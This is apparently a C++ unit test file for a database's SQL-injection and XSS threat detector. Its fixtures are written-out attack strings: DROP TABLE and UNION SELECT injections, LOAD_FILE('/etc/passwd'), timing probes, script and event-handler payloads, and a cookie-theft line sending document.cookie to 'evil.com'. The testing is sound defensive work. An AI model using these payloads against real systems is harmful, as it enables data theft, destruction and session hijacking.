#include <iostream>
#include <cassert>
#include <string>

#include "ai/immune/threat_detector.h"

using namespace chronosdb;
using namespace chronosdb::ai;

/**
 * Threat Detector Tests
 *
 * Tests SQL injection and XSS attack pattern detection.
 * Covers: HIGH/MEDIUM/LOW severity for both categories,
 * clean query validation, case insensitivity, combined analysis,
 * report conversion, and stats tracking.
 */

// ========================================================================
// SQL INJECTION TESTS
// ========================================================================

void TestThreatDetectorSQLInjectionHigh() {
    std::cout << "[TEST] ThreatDetector SQL Injection HIGH..." << std::endl;

    ThreatDetector detector;

    // UNION SELECT - classic data exfiltration
    auto r1 = detector.DetectSQLInjection(
        "SELECT * FROM users WHERE id = 1 UNION SELECT * FROM passwords");
    assert(r1.type == ThreatType::SQL_INJECTION);
    assert(r1.severity == AnomalySeverity::HIGH);
    std::cout << "  -> UNION SELECT detected as HIGH (pattern: " << r1.pattern_matched << ")" << std::endl;

    // DROP TABLE injection via semicolon
    auto r2 = detector.DetectSQLInjection(
        "INSERT INTO logs VALUES('test'); DROP TABLE users; --");
    assert(r2.type == ThreatType::SQL_INJECTION);
    assert(r2.severity == AnomalySeverity::HIGH);
    std::cout << "  -> ; DROP TABLE detected as HIGH" << std::endl;

    // DELETE injection via semicolon
    auto r3 = detector.DetectSQLInjection(
        "SELECT 1; DELETE FROM critical_data WHERE 1=1");
    assert(r3.type == ThreatType::SQL_INJECTION);
    assert(r3.severity == AnomalySeverity::HIGH);
    std::cout << "  -> ; DELETE detected as HIGH" << std::endl;

    // TRUNCATE injection
    auto r4 = detector.DetectSQLInjection(
        "SELECT name FROM t; TRUNCATE TABLE users");
    assert(r4.type == ThreatType::SQL_INJECTION);
    assert(r4.severity == AnomalySeverity::HIGH);
    std::cout << "  -> ; TRUNCATE detected as HIGH" << std::endl;

    // INTO OUTFILE - file writing attack
    auto r5 = detector.DetectSQLInjection(
        "SELECT * FROM users INTO OUTFILE '/tmp/hack.txt'");
    assert(r5.type == ThreatType::SQL_INJECTION);
    assert(r5.severity == AnomalySeverity::HIGH);
    std::cout << "  -> INTO OUTFILE detected as HIGH" << std::endl;

    // LOAD_FILE - file reading attack
    auto r6 = detector.DetectSQLInjection(
        "SELECT LOAD_FILE('/etc/passwd')");
    assert(r6.type == ThreatType::SQL_INJECTION);
    assert(r6.severity == AnomalySeverity::HIGH);
    std::cout << "  -> LOAD_FILE detected as HIGH" << std::endl;

    std::cout << "[SUCCESS] ThreatDetector SQL Injection HIGH passed!" << std::endl;
}

void TestThreatDetectorSQLInjectionMedium() {
    std::cout << "[TEST] ThreatDetector SQL Injection MEDIUM..." << std::endl;

    ThreatDetector detector;

    // OR 1=1 - classic auth bypass
    auto r1 = detector.DetectSQLInjection(
        "SELECT * FROM users WHERE username='admin' OR 1=1");
    assert(r1.type == ThreatType::SQL_INJECTION);
    assert(r1.severity == AnomalySeverity::MEDIUM);
    std::cout << "  -> OR 1=1 detected as MEDIUM" << std::endl;

    // String-based tautology
    auto r2 = detector.DetectSQLInjection(
        "SELECT * FROM users WHERE name='' OR '1'='1'");
    assert(r2.type == ThreatType::SQL_INJECTION);
    assert(r2.severity == AnomalySeverity::MEDIUM);
    std::cout << "  -> OR '1'='1' detected as MEDIUM" << std::endl;

    // Comment injection
    auto r3 = detector.DetectSQLInjection(
        "SELECT * FROM users WHERE name='admin' --' AND pass='x'");
    assert(r3.type == ThreatType::SQL_INJECTION);
    assert(r3.severity >= AnomalySeverity::LOW);  // At least LOW
    std::cout << "  -> Comment injection (--) detected" << std::endl;

    // SLEEP() timing attack
    auto r4 = detector.DetectSQLInjection(
        "SELECT * FROM users WHERE id=1 AND SLEEP(5)");
    assert(r4.type == ThreatType::SQL_INJECTION);
    assert(r4.severity == AnomalySeverity::MEDIUM);
    std::cout << "  -> SLEEP() detected as MEDIUM" << std::endl;

    // BENCHMARK() timing attack
    auto r5 = detector.DetectSQLInjection(
        "SELECT BENCHMARK(1000000, SHA1('test'))");
    assert(r5.type == ThreatType::SQL_INJECTION);
    assert(r5.severity == AnomalySeverity::MEDIUM);
    std::cout << "  -> BENCHMARK() detected as MEDIUM" << std::endl;

    // information_schema probing
    auto r6 = detector.DetectSQLInjection(
        "SELECT table_name FROM information_schema.tables");
    assert(r6.type == ThreatType::SQL_INJECTION);
    assert(r6.severity == AnomalySeverity::MEDIUM);
    std::cout << "  -> information_schema probing detected as MEDIUM" << std::endl;

    std::cout << "[SUCCESS] ThreatDetector SQL Injection MEDIUM passed!" << std::endl;
}

void TestThreatDetectorSQLInjectionLow() {
    std::cout << "[TEST] ThreatDetector SQL Injection LOW..." << std::endl;

    ThreatDetector detector;

    // Tautology-based probe
    auto r1 = detector.DetectSQLInjection(
        "SELECT * FROM users WHERE name='x' or 1' or '1");
    assert(r1.type == ThreatType::SQL_INJECTION);
    assert(r1.severity >= AnomalySeverity::LOW);
    std::cout << "  -> Tautology probe detected as LOW+" << std::endl;

    // String equality tautology
    auto r2 = detector.DetectSQLInjection(
        "SELECT * FROM t WHERE col='a' AND 'a'='a");
    assert(r2.type == ThreatType::SQL_INJECTION);
    assert(r2.severity >= AnomalySeverity::LOW);
    std::cout << "  -> String tautology 'a'='a detected as LOW+" << std::endl;

    std::cout << "[SUCCESS] ThreatDetector SQL Injection LOW passed!" << std::endl;
}

// ========================================================================
// XSS TESTS
// ========================================================================

void TestThreatDetectorXSSHigh() {
    std::cout << "[TEST] ThreatDetector XSS HIGH..." << std::endl;

    ThreatDetector detector;

    // Script tag injection
    auto r1 = detector.DetectXSS(
        "INSERT INTO comments VALUES('<script>alert(1)</script>')");
    assert(r1.type == ThreatType::XSS);
    assert(r1.severity == AnomalySeverity::HIGH);
    std::cout << "  -> <script> tag detected as HIGH" << std::endl;

    // javascript: protocol injection
    auto r2 = detector.DetectXSS(
        "UPDATE profile SET url='javascript:document.cookie'");
    assert(r2.type == ThreatType::XSS);
    assert(r2.severity == AnomalySeverity::HIGH);
    std::cout << "  -> javascript: protocol detected as HIGH" << std::endl;

    // eval() injection
    auto r3 = detector.DetectXSS(
        "INSERT INTO data VALUES('eval(atob(\"dGVzdA==\"))')");
    assert(r3.type == ThreatType::XSS);
    assert(r3.severity == AnomalySeverity::HIGH);
    std::cout << "  -> eval() detected as HIGH" << std::endl;

    // document.cookie theft
    auto r4 = detector.DetectXSS(
        "INSERT INTO xss VALUES('new Image().src=\"http://evil.com?\"+document.cookie')");
    assert(r4.type == ThreatType::XSS);
    assert(r4.severity == AnomalySeverity::HIGH);
    std::cout << "  -> document.cookie detected as HIGH" << std::endl;

    // document.write injection
    auto r5 = detector.DetectXSS(
        "INSERT INTO t VALUES('document.write(\"<h1>hacked</h1>\")')");
    assert(r5.type == ThreatType::XSS);
    assert(r5.severity == AnomalySeverity::HIGH);
    std::cout << "  -> document.write detected as HIGH" << std::endl;

    std::cout << "[SUCCESS] ThreatDetector XSS HIGH passed!" << std::endl;
}

void TestThreatDetectorXSSMedium() {
    std::cout << "[TEST] ThreatDetector XSS MEDIUM..." << std::endl;

    ThreatDetector detector;

    // Event handler injection
    auto r1 = detector.DetectXSS(
        "INSERT INTO comments VALUES('<img src=x onerror=alert(1)>')");
    assert(r1.type == ThreatType::XSS);
    assert(r1.severity >= AnomalySeverity::MEDIUM);
    std::cout << "  -> onerror= handler detected as MEDIUM+" << std::endl;

    // iframe injection
    auto r2 = detector.DetectXSS(
        "INSERT INTO t VALUES('<iframe src=\"http://evil.com\"></iframe>')");
    assert(r2.type == ThreatType::XSS);
    assert(r2.severity == AnomalySeverity::MEDIUM);
    std::cout << "  -> <iframe injection detected as MEDIUM" << std::endl;

    // onload handler
    auto r3 = detector.DetectXSS(
        "UPDATE bio SET html='<body onload=malicious()>'");
    assert(r3.type == ThreatType::XSS);
    assert(r3.severity >= AnomalySeverity::MEDIUM);
    std::cout << "  -> onload= handler detected as MEDIUM+" << std::endl;

    // SVG onload
    auto r4 = detector.DetectXSS(
        "INSERT INTO t VALUES('<svg onload=alert(1)>')");
    assert(r4.type == ThreatType::XSS);
    assert(r4.severity >= AnomalySeverity::MEDIUM);
    std::cout << "  -> <svg onload detected as MEDIUM+" << std::endl;

    std::cout << "[SUCCESS] ThreatDetector XSS MEDIUM passed!" << std::endl;
}

void TestThreatDetectorXSSLow() {
    std::cout << "[TEST] ThreatDetector XSS LOW..." << std::endl;

    ThreatDetector detector;

    // alert() function
    auto r1 = detector.DetectXSS(
        "INSERT INTO t VALUES('alert(document.domain)')");
    assert(r1.type == ThreatType::XSS);
    assert(r1.severity >= AnomalySeverity::LOW);
    std::cout << "  -> alert() detected as LOW+" << std::endl;

    // prompt() function
    auto r2 = detector.DetectXSS(
        "INSERT INTO t VALUES('prompt(1)')");
    assert(r2.type == ThreatType::XSS);
    assert(r2.severity >= AnomalySeverity::LOW);
    std::cout << "  -> prompt() detected as LOW+" << std::endl;

    // confirm() function
    auto r3 = detector.DetectXSS(
        "INSERT INTO t VALUES('confirm(1)')");
    assert(r3.type == ThreatType::XSS);
    assert(r3.severity >= AnomalySeverity::LOW);
    std::cout << "  -> confirm() detected as LOW+" << std::endl;

    std::cout << "[SUCCESS] ThreatDetector XSS LOW passed!" << std::endl;
}

// ========================================================================
// CLEAN QUERIES (NO FALSE POSITIVES)
// ========================================================================

void TestThreatDetectorCleanQueries() {
    std::cout << "[TEST] ThreatDetector Clean Queries (No False Positives)..." << std::endl;

    ThreatDetector detector;

    // Normal INSERT
    auto r1 = detector.Analyze("INSERT INTO orders VALUES(1, 'John Smith', 99.99)");
    assert(r1.type == ThreatType::NONE);
    std::cout << "  -> Normal INSERT: clean" << std::endl;

    // Normal SELECT with WHERE
    auto r2 = detector.Analyze("SELECT name, age FROM users WHERE age > 25 AND city = 'New York'");
    assert(r2.type == ThreatType::NONE);
    std::cout << "  -> Normal SELECT with WHERE: clean" << std::endl;

    // Normal UPDATE
    auto r3 = detector.Analyze("UPDATE products SET price = 10.50 WHERE id = 3");
    assert(r3.type == ThreatType::NONE);
    std::cout << "  -> Normal UPDATE: clean" << std::endl;

    // Normal DELETE
    auto r4 = detector.Analyze("DELETE FROM temp_logs WHERE created_at < '2024-01-01'");
    assert(r4.type == ThreatType::NONE);
    std::cout << "  -> Normal DELETE: clean" << std::endl;

    // SELECT with JOIN (no injection patterns)
    auto r5 = detector.Analyze(
        "SELECT o.id, u.name FROM orders o INNER JOIN users u ON o.user_id = u.id");
    assert(r5.type == ThreatType::NONE);
    std::cout << "  -> Normal JOIN query: clean" << std::endl;

    // Values with apostrophes in names
    auto r6 = detector.Analyze("INSERT INTO users VALUES(1, 'O''Brien', 'Dublin')");
    assert(r6.type == ThreatType::NONE);
    std::cout << "  -> Name with apostrophe (O'Brien): clean" << std::endl;

    // Normal aggregate
    auto r7 = detector.Analyze("SELECT COUNT(*), AVG(price) FROM products WHERE category = 'electronics'");
    assert(r7.type == ThreatType::NONE);
    std::cout << "  -> Aggregate query: clean" << std::endl;

    // Empty query
    auto r8 = detector.Analyze("");
    assert(r8.type == ThreatType::NONE);
    std::cout << "  -> Empty query: clean" << std::endl;

    std::cout << "[SUCCESS] ThreatDetector Clean Queries passed!" << std::endl;
}

// ========================================================================
// CASE INSENSITIVITY
// ========================================================================

void TestThreatDetectorCaseInsensitive() {
    std::cout << "[TEST] ThreatDetector Case Insensitive..." << std::endl;

    ThreatDetector detector;

    // Mixed case SQL injection
    auto r1 = detector.DetectSQLInjection("SELECT * FROM t UNION SELECT * FROM passwords");
    assert(r1.type == ThreatType::SQL_INJECTION);
    assert(r1.severity == AnomalySeverity::HIGH);
    std::cout << "  -> UNION SELECT (uppercase) detected" << std::endl;

    auto r2 = detector.DetectSQLInjection("select * from t union select * from passwords");
    assert(r2.type == ThreatType::SQL_INJECTION);
    assert(r2.severity == AnomalySeverity::HIGH);
    std::cout << "  -> union select (lowercase) detected" << std::endl;

    auto r3 = detector.DetectSQLInjection("SeLeCt * FrOm t UnIoN SeLeCt * from pass");
    assert(r3.type == ThreatType::SQL_INJECTION);
    assert(r3.severity == AnomalySeverity::HIGH);
    std::cout << "  -> UnIoN SeLeCt (mixed case) detected" << std::endl;

    // Mixed case XSS
    auto r4 = detector.DetectXSS("<SCRIPT>alert(1)</SCRIPT>");
    assert(r4.type == ThreatType::XSS);
    assert(r4.severity == AnomalySeverity::HIGH);
    std::cout << "  -> <SCRIPT> (uppercase) detected" << std::endl;

    auto r5 = detector.DetectXSS("<ScRiPt>document.cookie</sCrIpT>");
    assert(r5.type == ThreatType::XSS);
    assert(r5.severity == AnomalySeverity::HIGH);
    std::cout << "  -> <ScRiPt> (mixed case) detected" << std::endl;

    auto r6 = detector.DetectXSS("JAVASCRIPT:void(0)");
    assert(r6.type == ThreatType::XSS);
    assert(r6.severity == AnomalySeverity::HIGH);
    std::cout << "  -> JAVASCRIPT: (uppercase) detected" << std::endl;

    std::cout << "[SUCCESS] ThreatDetector Case Insensitive passed!" << std::endl;
}

// ========================================================================
// COMBINED ANALYSIS
// ========================================================================

void TestThreatDetectorCombinedAnalysis() {
    std::cout << "[TEST] ThreatDetector Combined Analysis..." << std::endl;

    ThreatDetector detector;

    // Query with both SQL injection AND XSS - should return highest
    auto r1 = detector.Analyze(
        "INSERT INTO t VALUES('<script>alert(1)</script>'); DROP TABLE users; --");
    assert(r1.type != ThreatType::NONE);
    assert(r1.severity == AnomalySeverity::HIGH);
    std::cout << "  -> Combined SQLi+XSS returns HIGH (type="
              << ThreatDetector::ThreatTypeToString(r1.type) << ")" << std::endl;

    // Only XSS, no SQLi
    auto r2 = detector.Analyze(
        "INSERT INTO comments VALUES('<script>steal()</script>')");
    assert(r2.type == ThreatType::XSS);
    assert(r2.severity == AnomalySeverity::HIGH);
    std::cout << "  -> XSS-only correctly identified" << std::endl;

    // Only SQLi, no XSS
    auto r3 = detector.Analyze(
        "SELECT * FROM users WHERE id=1 UNION SELECT * FROM secrets");
    assert(r3.type == ThreatType::SQL_INJECTION);
    assert(r3.severity == AnomalySeverity::HIGH);
    std::cout << "  -> SQLi-only correctly identified" << std::endl;

    // Clean query
    auto r4 = detector.Analyze("SELECT * FROM products WHERE price > 10");
    assert(r4.type == ThreatType::NONE);
    assert(r4.severity == AnomalySeverity::NONE);
    std::cout << "  -> Clean query returns NONE" << std::endl;

    std::cout << "[SUCCESS] ThreatDetector Combined Analysis passed!" << std::endl;
}

// ========================================================================
// ANOMALY REPORT CONVERSION
// ========================================================================

void TestThreatDetectorToAnomalyReport() {
    std::cout << "[TEST] ThreatDetector ToAnomalyReport..." << std::endl;

    ThreatResult threat;
    threat.type = ThreatType::SQL_INJECTION;
    threat.severity = AnomalySeverity::HIGH;
    threat.pattern_matched = "union select";
    threat.description = "SQL injection pattern detected: 'union select'";

    auto report = ThreatDetector::ToAnomalyReport(threat, "users", "hacker123");

    assert(report.table_name == "users");
    assert(report.user == "hacker123");
    assert(report.severity == AnomalySeverity::HIGH);
    assert(report.timestamp_us > 0);
    assert(report.description.find("SQL_INJECTION") != std::string::npos);
    assert(report.description.find("union select") != std::string::npos);
    assert(report.description.find("users") != std::string::npos);
    assert(report.description.find("hacker123") != std::string::npos);
    std::cout << "  -> Report fields populated correctly" << std::endl;
    std::cout << "  -> Description: " << report.description << std::endl;

    // Test XSS report
    ThreatResult xss_threat;
    xss_threat.type = ThreatType::XSS;
    xss_threat.severity = AnomalySeverity::MEDIUM;
    xss_threat.pattern_matched = "onerror=";
    xss_threat.description = "XSS attack pattern detected: 'onerror='";

    auto xss_report = ThreatDetector::ToAnomalyReport(xss_threat, "comments", "user1");
    assert(xss_report.description.find("XSS") != std::string::npos);
    std::cout << "  -> XSS report description contains 'XSS'" << std::endl;

    std::cout << "[SUCCESS] ThreatDetector ToAnomalyReport passed!" << std::endl;
}

// ========================================================================
// STATS TRACKING
// ========================================================================

void TestThreatDetectorStats() {
    std::cout << "[TEST] ThreatDetector Stats..." << std::endl;

    ThreatDetector detector;

    assert(detector.GetTotalThreatsDetected() == 0);
    assert(detector.GetSQLInjectionCount() == 0);
    assert(detector.GetXSSCount() == 0);
    std::cout << "  -> Initial stats are 0" << std::endl;

    // Trigger some SQL injection detections
    detector.DetectSQLInjection("' OR 1=1 --");
    detector.DetectSQLInjection("UNION SELECT * FROM passwords");
    detector.DetectSQLInjection("'; DROP TABLE users; --");
    std::cout << "  -> Triggered 3 SQL injection detections" << std::endl;

    // Trigger some XSS detections
    detector.DetectXSS("<script>alert(1)</script>");
    detector.DetectXSS("<img src=x onerror=alert(1)>");
    std::cout << "  -> Triggered 2 XSS detections" << std::endl;

    assert(detector.GetSQLInjectionCount() == 3);
    assert(detector.GetXSSCount() == 2);
    assert(detector.GetTotalThreatsDetected() == 5);
    std::cout << "  -> SQL injection count = " << detector.GetSQLInjectionCount() << std::endl;
    std::cout << "  -> XSS count = " << detector.GetXSSCount() << std::endl;
    std::cout << "  -> Total threats = " << detector.GetTotalThreatsDetected() << std::endl;

    // Clean query should NOT increment stats
    detector.DetectSQLInjection("SELECT * FROM products WHERE id = 5");
    detector.DetectXSS("INSERT INTO logs VALUES('normal text')");
    assert(detector.GetTotalThreatsDetected() == 5);
    std::cout << "  -> Clean queries did not increment stats" << std::endl;

    // ThreatType string conversion
    assert(ThreatDetector::ThreatTypeToString(ThreatType::NONE) == "NONE");
    assert(ThreatDetector::ThreatTypeToString(ThreatType::SQL_INJECTION) == "SQL_INJECTION");
    assert(ThreatDetector::ThreatTypeToString(ThreatType::XSS) == "XSS");
    std::cout << "  -> ThreatType string conversion correct" << std::endl;

    std::cout << "[SUCCESS] ThreatDetector Stats passed!" << std::endl;
}
